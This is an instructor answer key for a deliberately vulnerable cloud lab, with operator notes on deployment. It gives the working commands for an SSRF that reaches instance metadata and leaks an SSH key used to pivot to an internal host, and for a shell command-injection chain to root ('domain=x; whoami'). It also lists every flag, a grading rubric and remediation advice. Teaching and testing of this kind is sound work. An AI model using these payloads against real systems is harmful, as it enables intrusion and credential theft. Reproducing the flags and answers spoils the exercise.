# CloudBreach Range — Instructor Key (ground truth)

Full exact chain, real commands, against a genuinely deployed OCI range (see
`../terraform/`). Nothing here is simulated — every command below hits real
OCI services and real Compute instances.

This range has **two independent vulnerabilities**, on two different Staff
Tools pages, leading to the *same* eventual goal (a shell on `internal-01`)
by two genuinely different routes — not one chain split into two labs. Give
different students/team members different chains if you want to avoid
identical writeups: Chain A (SSRF) is Stages 1–5 below; Chain B (command
injection) is its own section further down.

---

## Chain A (Flag 1): SSRF → reach OCI instance metadata

The `/preview` route in `app/web_app.py` fetches any URL server-side, and
forwards an optional `headers=` JSON param through untouched — that's what's
needed here, since OCI IMDS v2 requires `Authorization: Bearer Oracle` on
every GET request (a static, publicly-documented value, not a per-session
secret — a much weaker mitigation than AWS's IMDSv2 token flow, but still a
real requirement to satisfy).

```bash
curl -G "https://<web01_domain>/preview" \
  --data-urlencode "url=http://169.254.169.254/opc/v2/instance/metadata/" \
  --data-urlencode 'headers={"Authorization":"Bearer Oracle"}'
```

Response includes the custom metadata keys set at launch:
```json
{
  "backup_recovery_url": "https://objectstorage.<region>.oraclecloud.com/p/<token>/n/<namespace>/b/cloudbreach-secrets/o/internal01-ssh-key.pem",
  "backup_recovery_notes": "Meridian ops: internal-01 recovery key, rotate quarterly per ticket MERI-4471"
}
```

## Stage 2: Follow the presigned Object Storage URL

The `backup_recovery_url` value is a genuine OCI Pre-Authenticated Request
(PAR) — a presigned URL, OCI's equivalent of an S3 presigned link. It needs
**no further authentication at all**, not even the `Bearer Oracle` header:

```bash
curl -G "https://<web01_domain>/preview" \
  --data-urlencode "url=<the backup_recovery_url value>"
```
(or just `curl` it directly if it's reachable from your own machine too —
PARs work over the open internet by design, they're not restricted to
in-VCN traffic)

Response body is the raw PEM-encoded SSH private key for `internal-01`.
Save it and fix permissions:
```bash
curl -s "<backup_recovery_url>" > internal01_key.pem
chmod 600 internal01_key.pem
```

## Stage 3: Find internal-01's private IP

Not embedded anywhere on purpose — this is the "recon inside a network
you've partially compromised" step. Options, in rough order of realism:

- `terraform output internal01_private_ip` if you have operator access to
  the Terraform state (not the intended path, but fine for grading/testing)
- From `web-01` itself (once you have any shell there, e.g. via further
  exploitation beyond this range's intended scope): `ip route`, or scan the
  private subnet CIDR (`10.0.2.0/24` per this range's `network.tf`) —
  `internal-01` is the only host answering on port 22 there
- In a real assessment: OCI Search / `oci compute instance list` if you'd
  also compromised a set of credentials with that permission (out of scope
  for this range's intended chain, but worth discussing in a writeup as
  "what a more privileged foothold would additionally expose")

## Stage 4: Lateral movement via SSH ProxyJump

```bash
scp -i <your admin key> internal01_key.pem ubuntu@<web01_domain>:~/
ssh -i internal01_key.pem -o ProxyJump=ubuntu@<web01_domain> ubuntu@<internal01_private_ip>
```

## Stage 5: Proof

```bash
cat /home/ubuntu/flag.txt
# flag{fd16978f423c836c563079917db6978a}
cat /opt/meridian-internal/customer-export-notice.txt
```

---

## Chain B (Flag 2): OS command injection → real RCE on web-01

Different vulnerability class from Chain A, on a different Staff Tools
page. Genuinely different bug (`shell=True` string formatting, not a
missing allow-list) — not a variant of the same SSRF.

### B1: Find the injection

`/tools/lookup` runs `whois` on whatever `domain=` you pass, via
`subprocess.run(f"whois {domain}", shell=True, ...)` in `app/web_app.py` —
no sanitization, no argument-list form. Anything after a shell metacharacter
(`;`, `|`, `&&`, backticks, `$(...)`) runs as a second command.

```bash
curl -sG "https://<web01_domain>/tools/lookup" --data-urlencode "domain=example.com; id"
```
Response includes real `whois` output for `example.com` **and** the output
of `id` — proof of command execution, not just a crash/error.

### B2: This is root RCE, not a limited shell

`cloudbreach-web.service` runs `User=root` (see `terraform/user_data/web01.sh.tpl`)
— a real, still-too-common misconfiguration this range keeps rather than
"fixes," specifically so this chain demonstrates full compromise, not a
low-priv foothold. Confirm:
```bash
curl -sG "https://<web01_domain>/tools/lookup" --data-urlencode "domain=x; whoami"
# whoami output should be: root
```

### B3: Proof (Flag 2)

```bash
curl -sG "https://<web01_domain>/tools/lookup" --data-urlencode "domain=x; cat /opt/flag2.txt"
# flag{e2f73445060fd21acbe97b6794dfbea2}
```

### B4: Alternate route to the same internal-01 pivot

With real command execution (not just a read-only SSRF primitive), the
IMDS → PAR → SSH-key chain from Chain A is reachable *more directly* — no
need for the `headers=` forwarding trick, just run `curl` for real:

```bash
curl -sG "https://<web01_domain>/tools/lookup" \
  --data-urlencode 'domain=x; curl -s -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v2/instance/metadata/backup_recovery_url'
```
Returns the same `backup_recovery_url` PAR as Chain A Stage 1 — from here,
Stages 2–5 above are identical (download the key, find `internal-01`'s
private IP, pivot, read `/home/ubuntu/flag.txt`). Same destination, two
genuinely independent ways to get there — live-verified both ways on
2026-08-26.

---

## Flag reference

| Chain | Stage | Flag | Notes |
|---|---|---|---|
| A (SSRF) | 1–2 (metadata + PAR leak) | `flag{ebf88885ddcaf4ac84b44c698c0cbdfd}` | Award for successfully retrieving the raw SSH private key content via the metadata → PAR chain — no embedded string in the response itself to check automatically, self-verify by confirming the PEM parses (`openssl rsa -in internal01_key.pem -check`) |
| A (SSRF) | 5 (lateral movement) | `flag{fd16978f423c836c563079917db6978a}` | Embedded on `internal-01`, `/home/ubuntu/flag.txt` — Chain B also ends here if that route is taken instead |
| B (command injection) | B3 (RCE proof) | `flag{e2f73445060fd21acbe97b6794dfbea2}` | Embedded on `web-01`, `/opt/flag2.txt`, readable only via actual command execution |

---

## Remediation (what you'd actually tell Meridian Freight Co.)

| Finding | Fix |
|---|---|
| SSRF in `/preview` | Validate/allow-list target hosts; block the `169.254.169.254`/link-local range explicitly at minimum; strip/ignore any attacker-supplied `Authorization` header rather than forwarding it verbatim |
| Presigned URL stashed in instance metadata | Never place credential material (including presigned URLs) in instance metadata — use Instance Principals + a proper secrets service instead, and treat metadata as attacker-readable the moment any SSRF exists anywhere on the host |
| PAR with no IP/network restriction | OCI PARs can't be network-scoped, which is exactly why they shouldn't hold long-lived credential-equivalent material — prefer short TTLs and rotate immediately after use if a PAR must be used at all |
| No IMDS access monitoring | OCI Cloud Guard / Audit logs would flag unusual `GetObject` access patterns on the bucket from outside the expected caller in a real environment |
| OS command injection in `/tools/lookup` | Never build a shell command via string formatting; use `subprocess.run(["whois", domain], shell=False)` with an argument list, and validate `domain` against a strict hostname pattern regardless |
| App runs as root (`cloudbreach-web.service`) | Run as an unprivileged, dedicated service account — turns this specific bug from full root RCE into a contained low-priv foothold, a materially different severity even before the injection itself is fixed |

---

## Grading rubric (100 pts, adjust as needed)

**Chain A (SSRF):**

| Criterion | Points |
|---|---|
| Demonstrated reaching OCI IMDS v2 through the SSRF (correct header bypass) | 20 |
| Correctly enumerated custom instance metadata and identified the leaked URL | 15 |
| Retrieved the actual SSH private key via the PAR | 20 |
| Correctly identified `internal-01`'s private IP through legitimate recon | 10 |
| Demonstrated actual shell/file access on `internal-01` (not just "could reach it") | 25 |
| Write-up: clear narrative + differentiated remediation priorities | 10 |

**Chain B (command injection)** — same 100-point scale, use whichever chain
the student was assigned:

| Criterion | Points |
|---|---|
| Identified `/tools/lookup` as vulnerable and demonstrated a working injection | 25 |
| Confirmed the RCE runs as root, not a limited user | 10 |
| Retrieved Flag 2 via actual command execution (not guessed) | 15 |
| Used the RCE to reach the same `backup_recovery_url` PAR (Stage B4) | 20 |
| Completed the pivot into `internal-01` | 20 |
| Write-up: clear narrative + differentiated remediation priorities, including the root-execution finding as its own item, not folded into the injection finding | 10 |

---

## Known limitations / honest caveats

- **443 opened to the world (`0.0.0.0/0`), no longer scoped to
  `allowed_cidr`, 2026-08-28** — direct fallout from the incident just
  below: a team member trying to play got a silent "site can't be
  reached" because `allowed_cidr` is a single CIDR (the operator's own
  home IP), and 443 was still scoped to it. `allowed_cidr` was never
  going to scale to "however many teammates want to play, from wherever
  they are" without constant manual upkeep — and unlike SSH (still scoped
  to `allowed_cidr`, genuine operator/admin access), the web app is
  *meant* to be attacked by whoever's playing, so exposing it publicly
  isn't adding real risk beyond what the range already intends (same
  reasoning port 80 was already world-open for, for ACME). Just a
  `network.tf` NSG-rule change (`web01_ingress_https.source`), applied
  with `terraform apply` — no instance impact, live-verified afterward.
- **`allowed_cidr` drift caused a real "is the range down?" scare,
  2026-08-27 — turned out to be nothing wrong with the range at all.**
  The operator's home IP had changed again (dynamic ISP IP, the same
  class of drift documented further below), so port 443 (scoped to
  `allowed_cidr`) silently stopped accepting connections from the new IP
  — but SSH (port 22, same `allowed_cidr`) kept working, exactly the
  CGNAT/dynamic-routing quirk already documented below, which made it
  briefly look server-side. Diagnosed properly this time: server-side
  health checked first (`ss -tlnp` showed nginx listening on both
  0.0.0.0:443/:80, a local `curl 127.0.0.1` returned 200, host iptables
  allowed both ports) *before* touching anything — confirming the range
  itself was completely healthy, then compared `curl checkip.amazonaws.com`
  against `terraform.tfvars`'s `allowed_cidr` to find the actual mismatch.
  Fixed with an `allowed_cidr`-only `terraform apply` (NSG rule update,
  no instance impact).
  While applying that unrelated one-line fix, hit a **second, genuinely
  unrelated bug**: `terraform apply` also tried to update both instances'
  `source_details.source_id` in place and failed with a confusing
  `sourceDetails.kmsKeyId size must be between 1 and 255` error. Root
  cause: `data.oci_core_images` always fetches whichever Ubuntu 22.04
  image is currently newest, so its result can differ between one `plan`
  and the next purely because Oracle published a new image — and OCI's
  API doesn't actually support changing a running instance's boot image
  in place, so the attempt just fails (with a genuinely unhelpful,
  seemingly-unrelated error, likely a provider-version quirk — the error
  itself noted this provider is "114 updates behind current"). Both
  instances were completely unaffected (the API call failed before
  changing anything — confirmed via unchanged `uptime` and all services
  still `active` on both boxes). Fixed for good with `lifecycle {
  ignore_changes = [source_details] }` on both `oci_core_instance`
  resources in `compute.tf` — `source_id` should only ever matter at
  initial launch anyway; `terraform plan` shows clean afterward.
  **Takeaway for next time something looks like the range is "down":
  check server-side health directly over SSH first** (services, local
  curl, host firewall) **before assuming anything's actually broken** —
  in both incidents here, the range itself was fine the whole time.
- **Removed the last hardcoded/baked-in private IP from the whole range,
  2026-08-27, and added a `check-readiness.sh` health check alongside the
  hourly reset.** Prompted by wanting to never again be caught out by an
  IP changing underneath the range (as literally happened during the
  Tokyo migration below, and every time `internal-01` gets replaced on its
  own via `reset.sh internal01`). What changed:
  1. **internal-01 now has a stable internal DNS name.** Added
     `hostname_label = "internal01"` + `assign_private_dns_record = true`
     to its VNIC (`network.tf`'s VCN/subnets already had `dns_label`s set:
     `cloudbreach` / `private`). Together these resolve as
     `internal01.private.cloudbreach.oraclevcn.com` from anywhere inside
     the VCN (i.e. from `web-01`) — a new `local.internal01_dns_fqdn` in
     `compute.tf`, built from the actual subnet/VCN `dns_label`s rather
     than typed out by hand, so it can't drift from what OCI assigns.
  2. **`web-01`'s own `reset-range.sh`/`check-readiness.sh` now SSH to
     internal-01 by that DNS name, not a private IP baked in at web-01's
     own boot time** (`compute.tf` no longer passes
     `internal01_private_ip` into the `user_data` template at all — a new
     `internal01_host` template var carries the DNS name instead). This
     was the fragility that actually mattered: previously, if
     `internal-01` was ever replaced without also redeploying `web-01`,
     web-01's baked-in IP would go stale and every hourly reset would
     silently start failing to reach it.
  3. Removing the `oci_core_instance.internal01.private_ip` reference from
     web-01's config also removed the *implicit* Terraform dependency that
     used to guarantee internal-01 existed before web-01's first-boot
     reset attempt ran. Made that ordering explicit instead:
     `depends_on = [oci_core_instance.internal01]` on the `web01` resource.
  4. Added `internal01_dns_name` as a new Terraform output, and updated the
     operator's own `~/.ssh/config`: the `cloudbreach-web01` alias's
     `HostName` is now `soulsecure.duckdns.org` (was the raw reserved IP),
     and `cloudbreach-internal01`'s is now the internal DNS name (was the
     raw private IP) — DNS resolution for the latter happens on the jump
     host (`web-01`, inside the VCN), not on the operator's own machine.
  5. **New `/opt/check-readiness.sh` on `web-01`**, run automatically at
     the end of every `reset-range.sh` invocation (so once at boot, then
     hourly via the same cron entry) and runnable on demand. Checks, and
     reports OK/FAIL per item rather than just assuming: both local
     services active, the app answering locally over HTTP and HTTPS,
     `/etc/cron.d/cloudbreach-reset` actually present, and — over the same
     DNS name/NSG path the reset script itself uses — that internal-01 is
     SSH-reachable and both Flag 1 and the notes file are present there.
     Logs a final `READY`/`NOT READY` line to the same
     `/var/log/cloudbreach-reset.log`.
  6. This forced replacing **both** instances at once (the VNIC/DNS change
     on internal-01, the `user_data` change on web-01) — a real, if small,
     re-run of the exact capacity risk this whole redesign exists to guard
     against. Checked current instance state first (`terraform state
     show` — both `RUNNING` on `VM.Standard.E2.1.Micro` in `ap-tokyo-1`,
     confirming that shape currently has capacity there) before applying;
     went through cleanly with no capacity errors. internal-01's private IP
     did change as a direct result (`10.0.2.203` → `10.0.2.178`) — living
     proof of exactly the fragility this fix removes. Also, predictably,
     burned another Let's Encrypt certificate slot on the already-rate-
     limited `web-01` (see the entry below) — expected, harmless, falls
     back to the self-signed cert as always.
  7. Live-verified end-to-end afterward: `check-readiness.sh` reported all
     8 checks OK and `READY`; both Chain A and Chain B flags still
     reachable; the operator's own `~/.ssh/config` (DNS-based now) works
     for both the direct `cloudbreach-web01` hop and the
     `cloudbreach-internal01` pivot through it; `terraform plan` shows no
     drift afterward.
- **Moved the hourly reset entirely onto `web-01` itself via cron,
  2026-08-27 — the operator-machine approach (Windows Task Scheduler +
  `soft-reset.sh`) turned out to be fundamentally unreliable and was
  dropped.** What happened, in order:
  1. `soft-reset.sh` (pure SSH, no OCI API calls — see the still-earlier
     entry below) worked correctly every time it was run **interactively**.
     Wired up via `Register-ScheduledTask` (hourly, `bash.exe -lc '...'`)
     it failed almost every unattended run with `scp: Connection closed`
     immediately after SSH auth — see `terraform/soft-reset.log`, which
     shows this failing on more than a dozen consecutive hourly firings.
     Reproduced the exact same failure running the identical command
     non-interactively by hand (so not Task-Scheduler-specific after all),
     tried exporting `HOME` explicitly in case git-bash's non-login shell
     was the issue — didn't fix it. Root cause never fully pinned down.
  2. Decision made to stop fighting the operator machine and move the
     whole mechanism onto `web-01` itself: a root crontab entry that
     restores pristine copies of `app/web_app.py` and `flag2.txt`, restarts
     the app + nginx, then **SSHes to `internal-01` using a real copy of
     its own admin key** (baked into the instance at `/root/.ssh/
     internal01_key`, 600 perms, via new `internal01_ssh_key`/
     `internal01_private_ip`/`flag1` template variables in `compute.tf`)
     to re-plant Flag 1 and the notes file — same NSG-permitted network
     path the intended vulnerability chain itself uses, just with a
     legitimately-held key instead of one obtained via SSRF/RCE. See
     `terraform/user_data/web01.sh.tpl`'s final block.
  3. First live boot of this design: the boot-time reset ran successfully
     (confirmed via `/var/log/cloudbreach-reset.log` showing a completed
     run, including a successful pivot to `internal-01`) — but `sudo
     crontab -l` came back **completely empty** right after boot. Assumed
     a race between `apt-get install -y cron` finishing and the immediate
     `( crontab -l; echo ... ) | crontab -` pipeline; added a `sleep 3`
     after the install as a precaution and redeployed to test the fix.
  4. **The `sleep 3` fix did not help — identical empty-crontab result on
     the very next boot.** Diagnostic: manually re-ran the exact same
     `crontab -` pipeline over SSH seconds after that boot, and it worked
     immediately — ruling out any package-readiness race (cron was already
     installed and `active` by that point). The real difference is that
     `crontab -l`/`crontab -` go through PAM (`pam_loginuid` in
     particular), which can misbehave early in a cloud-init boot before a
     normal login session exists — an interactive SSH session has one,
     cloud-init's own script execution doesn't.
  5. **Fix: write directly to `/etc/cron.d/cloudbreach-reset`** (a plain
     file, `0 * * * * root /opt/reset-range.sh ...`) instead of piping
     through the `crontab` command at all — cron reads `/etc/cron.d/`
     files directly, no PAM-gated binary involved. This is also just
     standard practice for provisioning cron jobs from boot
     scripts/config management for exactly this reason. Redeployed a
     third time and confirmed the file exists correctly immediately after
     boot (`ls -la /etc/cron.d/cloudbreach-reset` right after `cloud-init
     status` reported `done`) — this is the version that shipped.
  6. Unregistered the now-obsolete Windows Scheduled Task
     (`Unregister-ScheduledTask -TaskName "CloudBreachRangeSoftReset"`).
     `soft-reset.sh` itself is kept in the repo as a manual/ad-hoc tool
     (e.g. to force an immediate reset from the operator's machine without
     waiting for the next hourly cron firing) but is no longer any
     scheduled automation's entry point.
  7. **Side effect of three `web-01` redeploys in one day: hit Let's
     Encrypt's real rate limit** ("too many certificates (5) already
     issued for this exact set of identifiers in the last 168h0m0s") on
     the third one, since every redeploy's `certbot --nginx` line requests
     a fresh cert for the same `duckdns_domain`. Not a bug — `web01.sh.tpl`
     already treats the Certbot line as best-effort (`|| true`) specifically
     for cases like this, so the box fell back to serving its self-signed
     cert (still fully functional over HTTPS, just untrusted by default —
     confirmed both chains still work end-to-end with `curl -k`). Will
     silently re-obtain a real cert on the next redeploy after the rate
     limit window clears (~2026-08-28 06:12 UTC per the error's
     `Retry-After`). **Takeaway: don't redeploy `web-01` more than a
     couple of times in the same week if you want to keep a trusted cert
     — the reserved IP means you rarely need to anyway.**
- **Migrated the entire range from `ap-singapore-1` to a second tenancy in
  `ap-tokyo-1`, 2026-08-27** — after ~50 retries across roughly 2 hours,
  `ap-singapore-1`'s "Out of host capacity" (see below) never cleared.
  Singapore is a single-AD region with no in-region failover, and OCI
  Always Free tenancies have a hard cap on subscribed regions (attempting
  `oci iam region-subscription create` on the *existing* tenancy failed
  with `TenantCapacityExceeded` — not something fixable via the API, it's
  a genuine account-level limit), so the only real fix was standing up a
  **second, brand-new OCI tenancy** with `ap-tokyo-1` as its home region.
  What this actually involved, for anyone hitting the same wall:
  1. New tenancy, new API signing key (`~/.oci/oci_api_key_tokyo.pem`),
     added as a **named profile** (`[TOKYO]`) in the *same*
     `~/.oci/config` the original `[DEFAULT]` (Singapore) profile lives
     in — necessary because, unlike the `oci` CLI, the Terraform `oci`
     provider does **not** honor `$OCI_CLI_CONFIG_FILE`; it only ever
     reads the fixed `~/.oci/config` path, selecting a profile via its
     own `config_file_profile` argument. Added `oci_config_profile` as a
     new Terraform variable (default `"DEFAULT"`) specifically for this.
  2. Backed up (renamed, did **not** delete) the Singapore
     `terraform.tfstate`/`terraform.tfvars` — this range's Terraform
     state is tenancy-specific, so reusing it against a different
     tenancy would have been meaningless at best. Started completely
     fresh state for Tokyo in the same `terraform/` directory.
  3. New `terraform.tfvars`: `region = "ap-tokyo-1"`,
     `oci_config_profile = "TOKYO"`, a fresh `compartment_ocid` (the new
     tenancy's own root OCID), same `admin_ssh_public_key` (SSH keys
     aren't tenancy-scoped, reused as-is), current `allowed_cidr` (had
     drifted again — dynamic home IP, same gotcha as before).
  4. Deployed clean: `internal-01` (`VM.Standard.E2.1.Micro`) launched
     first-try in Tokyo. `web-01` on `VM.Standard.A1.Flex` immediately
     hit **the same "Out of host capacity" error, in the new region** —
     confirming this really is a per-shape capacity thing, not specific
     to Singapore. Switched `web01_instance_shape` to
     `VM.Standard.E2.1.Micro` (matching `internal-01`, which had just
     proven that shape had capacity) — needed `compute.tf`'s
     `shape_config` block converted from unconditional to a `dynamic`
     block (`for_each = strcontains(var.web01_instance_shape, "Flex") ?
     [1] : []`), since fixed shapes reject that block outright. Launched
     clean on retry.
  5. New public IP (`161.33.201.199`), so: re-pointed the DuckDNS A
     record, re-extracted `internal01_admin_ssh_key` (new key, new
     tenancy), updated the `cloudbreach-web01`/`cloudbreach-internal01`
     `~/.ssh/config` `HostName`s to the new IPs — `soft-reset.sh` itself
     needed **no changes**, since it was already written to use those
     config aliases rather than hardcoded IPs (see its own comments).
  6. Live-verified both chains end-to-end on the new deployment
     (including a full `soft-reset.sh` run) before considering this done.
  The original Singapore VCN/`internal-01` were left alone (not
  destroyed) — Always Free, no cost to leave idle, and Singapore capacity
  may well recover on its own someday if ever needed again.
- **"Out of host capacity" — a real, sometimes multi-hour OCI Always Free
  problem, hit directly 2026-08-26.** Recreating `web-01` after the Chain
  B changes above failed repeatedly with `500-InternalError, Out of host
  capacity` on `VM.Standard.E2.1.Micro` — ap-singapore-1 is a single-AD
  region, so there's no alternate AD to fail over to within the region.
  Switched `web-01` to `VM.Standard.A1.Flex` (`web01_instance_shape` in
  `variables.tf`, default changed, needs its own `shape_config` block and
  its own `data.oci_core_images` lookup since it's a different
  architecture — see `compute.tf`) hoping for a less-contended capacity
  pool, but **hit the identical error on A1.Flex too** — confirmed this
  was genuinely a regional capacity crunch affecting multiple shapes at
  once, not anything wrong with this config. `internal-01` was unaffected
  throughout (it launched fine, on `VM.Standard.E2.1.Micro`, at a
  different moment). 20+ retries over ~30 minutes did not clear it; this
  can genuinely take hours to resolve on Oracle's side. If you hit this:
  retry periodically (`reset.sh` is idempotent, safe to keep rerunning),
  try the other shape, or as a last resort redeploy to a multi-AD region
  and accept a new IP/domain.
- **Also found while reset-testing that day: an orphaned boot volume from
  `internal-01`'s very first failed launch attempt (2026-08-25) was never
  actually deleted** — only removed from Terraform state at the time
  (`terraform state rm`), which stops Terraform from managing it but
  doesn't touch the real resource. It sat there for a full day silently
  consuming one of Always Free's 2-boot-volume slots, which is *also* part
  of why the first `reset.sh` test that day failed (compounding the host-
  capacity issue above). Found via `oci bv boot-volume list` — anything
  `AVAILABLE` there that isn't attached to a current instance is an
  orphan; `oci bv boot-volume delete --boot-volume-id <id> --force` clears
  it. **Lesson**: `terraform state rm` on a resource that partially
  provisioned real infrastructure is not the same as that infrastructure
  being gone — always reconcile against `oci ... list` after one, not just
  Terraform's own state.
- **Built `terraform/soft-reset.sh` and an hourly Windows Scheduled Task
  specifically in response to the above** — a full instance replace
  (`reset.sh`) is exactly the kind of operation that can hit "Out of host
  capacity" on a bad day, which makes it a poor choice for unattended
  hourly automation. The soft reset never calls the OCI API at all (pure
  SSH: redeploy `app/web_app.py`, re-plant both flags, restart services),
  so it can't fail that way, and it's fast enough to run every hour without
  meaningfully interrupting whoever's mid-engagement. Needed
  `internal01_admin_ssh_key` as a new sensitive output (`outputs.tf`) plus
  two `~/.ssh/config` `Host` aliases with `ProxyJump` so the script can
  reach `internal-01` directly from the operator's machine using the same
  real key the intended vulnerability chain leaks — see README.md's
  "Automatic hourly reset" section for the exact one-time setup.
- **Chain B (command injection) added and live-verified 2026-08-26** —
  built specifically so a second student/team member gets a genuinely
  different vulnerability class to exercise instead of redoing Chain A's
  SSRF. Verified all of: normal `whois` use working, `; id` proving real
  command execution, confirmed running as root, Flag 2 retrieved via
  injection, and the alternate B4 route reaching the same PAR as Chain A
  (both chains independently confirmed to reach `internal-01`'s flag).
- **`allowed_cidr` needs updating if your own IP changes** — hit this
  directly while verifying Chain B: the operator's home/mobile IP had
  changed since the range was first deployed, so ports 22/443 (still
  scoped to the original `allowed_cidr`) silently stopped being reachable
  from the new IP (port 80 stayed fine, since that one's deliberately
  `0.0.0.0/0` for Certbot). SSH still worked briefly during diagnosis
  despite this, most likely because the ISP's CGNAT/dynamic routing sent
  that particular TCP connection out through a different, still-allowed
  egress IP than the one HTTPS used seconds later — not a bug in the NSG
  config, just a reminder that "SSH still works" isn't proof `allowed_cidr`
  is current. Fix is always the same: re-check `curl -s
  https://checkip.amazonaws.com`, update `terraform.tfvars`, `terraform
  apply` (NSG-only change, ~1s, no instance impact).
- **A `curl` "SSL connect error" / `CRYPT_E_REVOCATION_OFFLINE` while
  testing from Windows** is a local Windows Schannel issue (it couldn't
  reach the certificate's OCSP revocation-check endpoint from that
  specific machine at that moment), not a problem with the range's cert
  or server — confirmed by the exact same request succeeding immediately
  with `curl --ssl-no-revoke`, and by the server-side logs showing nginx
  and the app both healthy the whole time. If you hit this, it's worth
  retrying plain first (transient network blips clear up) before assuming
  anything is actually broken server-side.
- **Live-verified end-to-end 2026-08-25** against a real deployed range
  (tenancy region `ap-singapore-1`): SSRF → `Bearer Oracle` header bypass →
  instance metadata → `backup_recovery_url` → real PAR → real SSH private
  key (`openssl rsa -check` confirmed valid) → SSH pivot through `web-01`
  into `internal-01` (no public IP) → flag + notes file both confirmed. One
  transient OCI-side error hit during the very first `terraform apply`
  (`internal01`'s boot volume prep failed, instance auto-terminated,
  `terraform state rm` + re-apply fixed it in one retry) — not a bug in this
  Terraform config, a known-occasional OCI Compute launch flake; if you hit
  the same "problem occurred while preparing the instance's remote boot
  volume" error, just retry the same way.
- **Two real bugs hit and fixed while adding the HTTPS/full-site redesign
  (same date):**
  1. OCI instance metadata has a **32000-byte total cap**. The first version
     of `web01.sh.tpl` base64-encoded `web_app.py` *inside* the script, then
     `base64gzip()`'d the whole script again for `user_data` — once the app
     grew into a full multi-page site (~25KB), that double-base64 overhead
     pushed total metadata to ~48KB and `terraform apply` failed outright
     with `InvalidParameter: Metadata size ... cannot be larger than 32000
     bytes`. Fixed by embedding the raw file content directly in a quoted
     heredoc (no inner base64 layer) and switching the outer encoding from
     `base64encode()` to `base64gzip()` (cloud-init auto-detects gzip'd
     user-data after base64 decoding) — comfortably under the cap now.
  2. Ubuntu images on OCI ship with **host-level iptables rules that only
     allow inbound 22/tcp by default**, independent of NSG rules — an NSG
     allow on 80/443 is necessary but not sufficient. First HTTPS deploy sat
     up (nginx `active (running)`, cert generated correctly) but was
     completely unreachable externally until `iptables -I INPUT -p tcp
     --dport {80,443} -j ACCEPT` + `netfilter-persistent save` were added to
     `web01.sh.tpl`. Same class of gotcha the original port-5000 version of
     this range hit (see git history) — check host iptables, not just the
     NSG, whenever "service is up but unreachable" on an OCI box.
- **Self-signed cert upgraded to a real trusted Let's Encrypt certificate**
  (same date) — the browser "Not secure" warning on the self-signed cert was
  a fair thing to want fixed, and nip.io domains resolve for real, so
  Certbot's HTTP-01 challenge works against them exactly like any other
  domain. Required widening `web01_ingress_http`'s NSG rule from
  `allowed_cidr` to `0.0.0.0/0` (Let's Encrypt's validation servers connect
  from all over the world, not just the operator's IP) — port 80 only ever
  serves the ACME challenge path and a redirect to 443, so this is the
  standard low-risk pattern, not a real widening of the attack surface; 443
  (the actual app) stays scoped to `allowed_cidr`. `web01.sh.tpl` now runs
  Certbot automatically on every boot (best-effort, falls back to the
  self-signed cert if it fails) so a fresh `terraform apply` gets a real
  cert without a manual step. Verified live: `openssl x509` showed
  `issuer=... O=Let's Encrypt`, and a plain `curl` (no `-k`) succeeded.
- **Operational note, not a design bug**: while making the above change, an
  `terraform apply` invocation got killed by a tool-level timeout mid-flight
  after it had already issued the destroy call against the old `web-01` but
  before the replacement finished creating — the range was briefly down
  (`web-01` terminated, nothing else affected) until a follow-up apply
  recreated it. Always run `terraform apply`/`destroy` in a way that can't
  get killed mid-operation (background it, or give it a timeout comfortably
  longer than instance launch takes, ~45-60s here).
- **web-01's public IP was ephemeral through all of the above** — every
  `metadata`/`user_data` edit forces the OCI provider to destroy+recreate
  the instance (`metadata` is `ForceNew`), and an ephemeral public IP gets
  re-randomized on every recreate. Fine during active iteration, a real
  problem once docs reference a specific domain/IP as ground truth. Fixed
  by switching `web01` to a **RESERVED** public IP
  (`oci_core_public_ip.web01` in `compute.tf`, `assign_public_ip = false`
  on the instance's own VNIC instead): the IP address value now belongs to
  the tenancy, not the instance, and Terraform re-attaches it to whatever
  the current `web-01` instance is on every apply (see the
  `data.oci_core_private_ips.web01` → `oci_core_public_ip.web01` chain) —
  no dependency cycle, since `web01.sh.tpl` self-detects its own domain at
  boot via `checkip.amazonaws.com` rather than Terraform injecting it, so
  the instance's `user_data` never has to reference the public IP resource
  and create a circular dependency. Verified: switching to this changed the
  IP **one last time** (a plain in-place `assign_public_ip` toggle, 3s, no
  instance replacement) to `140.245.110.167` — this is now the permanent
  address as long as `oci_core_public_ip.web01` itself is never destroyed.
  One manual step was still needed after that one-time switch: since the
  instance wasn't recreated, its already-issued Let's Encrypt cert still
  matched the *old* domain — ran `certbot --nginx -d
  soulsecure.140.245.110.167.nip.io` once by hand to reissue for the new
  one. Future edits that force a real instance recreation won't need this
  manual step (Certbot runs automatically in `web01.sh.tpl` on every boot);
  it was only necessary this once because this particular change was an
  in-place update, not a recreate.
- **Migrated from the nip.io domain to a real DuckDNS name** (same date,
  right after the above): `soulsecure.duckdns.org`, free, registered at
  duckdns.org, A record pointed at the reserved IP. Requested purely for a
  cleaner-looking URL (no IP visible in the hostname) — functionally
  identical to the nip.io setup otherwise. `duckdns_domain` is now a
  Terraform variable (`variables.tf`, default `"soulsecure.duckdns.org"`)
  baked directly into `web01.sh.tpl` rather than self-detected via
  `checkip.amazonaws.com`, so both the fallback self-signed cert and the
  real Let's Encrypt cert Certbot requests on every boot use it correctly
  from a totally fresh instance with zero manual steps — verified by
  letting this specific change force a real web-01 recreation and watching
  Certbot succeed automatically for `soulsecure.duckdns.org` on first boot.
  An earlier attempt at also auto-updating the DuckDNS A record via a
  Terraform `null_resource` + `local-exec` was reverted — Windows'
  `cmd.exe`-based local-exec mangled the curl command's quoting (exit
  status 3, malformed URL); not worth fighting for what's pure insurance
  on top of the reserved IP fix, which already means the IP doesn't need
  re-pointing under normal operation. See `compute.tf`'s comment for the
  manual `curl .../update?...` command if the reserved IP is ever
  genuinely reassigned.
- **Current permanent address**: `https://soulsecure.duckdns.org/` — every
  example below uses `<web01_domain>` as a placeholder, but as of this
  section this specific value shouldn't change again. (This domain now
  points at the `ap-tokyo-1` deployment's reserved IP, `161.33.201.199`,
  not the original Singapore one — see the region-migration entry above.
  Same domain throughout, only the A record's target changed.)
- OCI IMDS's exact `Authorization` header enforcement has changed over time
  across image/agent versions — if `Bearer Oracle` doesn't work as shown,
  check what the actual 401/403 response body from `/opc/v2/` says on your
  specific image; it self-documents the expected header.
- `oci_core_images` picks the most recent Canonical Ubuntu 22.04 image
  available for the chosen shape at apply time — not pinned to one immutable
  image OCID, so a fresh `terraform apply` months from now may pick up a
  newer point release. Shouldn't change the exploit chain, but note it if
  something behaves differently than described here.
- Object Storage bucket names (`cloudbreach-secrets`) must be unique per
  OCI namespace (effectively per-tenancy) — if you're running more than one
  copy of this range in the same tenancy, rename the bucket in `storage.tf`.
